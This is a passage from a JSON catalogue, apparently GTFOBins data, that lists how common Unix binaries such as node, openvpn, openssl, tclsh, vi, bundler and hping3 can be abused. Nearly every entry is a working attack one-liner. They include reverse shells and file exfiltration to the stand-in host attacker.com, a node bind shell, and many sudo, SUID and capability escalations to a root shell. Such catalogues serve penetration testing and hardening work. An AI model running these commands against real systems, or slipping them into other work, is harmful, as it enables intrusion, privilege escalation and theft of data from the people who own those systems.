          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "bind-shell": [
        {
          "code": "export LPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(process.env.LPORT)'\n",
          "description": "It can bind a shell to a local port to allow remote network access."
        }
      ],
      "suid": [
        {
          "code": "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "capabilities": [
        {
          "code": "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n",
          "description": "If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
        }
      ]
    }
  },
  "yash": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "yash",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./yash",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo yash",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ghci": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ghci\nSystem.Process.callCommand \"/bin/sh\"\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "openvpn": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nopenvpn --config \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        },
        {
          "code": "LFILE=file_to_read\n./openvpn --config \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "LFILE=file_to_read\nsudo openvpn --config \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "run-mailcap": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "run-mailcap --action=view /etc/hosts\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "run-mailcap --action=view file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "run-mailcap --action=edit file_to_read",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ul": {
    "description": "The read file content is corrupted by replacing occurrences of `$'\\b_'` to terminal sequences and by converting tabs to spaces.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nul \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./ul \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo ul \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tshark": {
    "description": "This program is able to execute [`lua`](/gtfobins/less/) code.",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\ntshark -Xlua_script:$TF\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ]
    }
  },
  "byebug": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "check_memory": {
    "description": "This is the `check_memory` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "lwp-request": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nlwp-request \"file://$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "basenc": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "pr": {
    "description": "Some bytes are altered so it might not be suitable for binary files.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\npr -T $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\npr -T $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\npr -T $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "cdist": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "cdist shell -s /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo cdist shell -s /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "openssl": {
    "description": "",
    "functions": {
      "reverse-shell": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nopenssl s_client -quiet -connect $RHOST:$RPORT < \"$LFILE\"\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nopenssl s_client -quiet -connect $RHOST:$RPORT > \"$LFILE\"\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        },
        {
          "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nopenssl enc -in \"$TF\" -out \"$LFILE\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nopenssl enc -in \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        },
        {
          "code": "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "library-load": [
        {
          "code": "openssl req -engine ./lib.so",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ]
    }
  },
  "vi": {
    "description": "Modern Unix systems run [`vim`](/gtfobins/vim/) binary when `vi` is called.",
    "functions": {
      "shell": [
        {
          "code": "vi -c ':!/bin/sh' /dev/null",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "vi\n:set shell=/bin/sh\n:shell\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "vi file_to_write\niDATA\n^[\nw\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "vi file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo vi -c ':!/bin/sh' /dev/null",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "cobc": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "troff": {
    "description": "The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ntroff $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./troff $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo troff $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "hping3": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "hping3\n/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./hping3\n/bin/sh -p\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo hping3\n/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "alpine": {
    "description": "The file is displayed in the `alpine` curses terminal interface. Other options might be available, for example by pressing `S` is possible to save the file content elsewhere.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nalpine -F \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./alpine -F \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo alpine -F \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "pic": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\npic $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "pic -U\n.PS\nsh X sh X\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo pic -U\n.PS\nsh X sh X\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./pic -U\n.PS\nsh X sh X\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "bundler": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "bundler help\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "export BUNDLE_GEMFILE=x\nbundler exec /bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler console\nsystem('/bin/sh -c /bin/sh')\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundler install\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo bundler help\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "basez": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nbasez \"$LFILE\" | basez --decode\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./basez \"$LFILE\" | basez --decode\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo basez \"$LFILE\" | basez --decode\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "loginctl": {
    "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.\n\nThis might not work if run by unprivileged users depending on the system configuration.\n",
    "functions": {
      "shell": [
        {
          "code": "loginctl user-status\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo loginctl user-status\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "xetex": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "xetex --shell-escape '\\write18{/bin/sh}\\end'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./xetex --shell-escape '\\write18{/bin/sh}\\end'\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "choom": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "choom -n 0 /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./choom -n 0 -- /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo choom -n 0 /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tclsh": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "suid": [
        {
          "code": "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ascii-xfr": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nascii-xfr -ns \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo ascii-xfr -ns \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "gcloud": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "gcloud help\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo gcloud help\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "kubectl": {
    "description": "It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`.",
    "functions": {
      "file-upload": [
        {
          "code": "LFILE=dir_to_serve\nkubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "suid": [
        {
          "code": "LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "perlbug": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "unzip": {
    "description": "Certain `unzip` versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:\n\n```\ncp /bin/sh .\nchmod +s sh\nzip shell.zip sh\n```\n\nExtract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).\n",
    "functions": {
      "sudo": [
        {
          "code": "sudo unzip -K shell.zip\n./sh -p\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./unzip -K shell.zip\n./sh -p\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "pandoc": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\npandoc -t plain \"$LFILE\"\n",
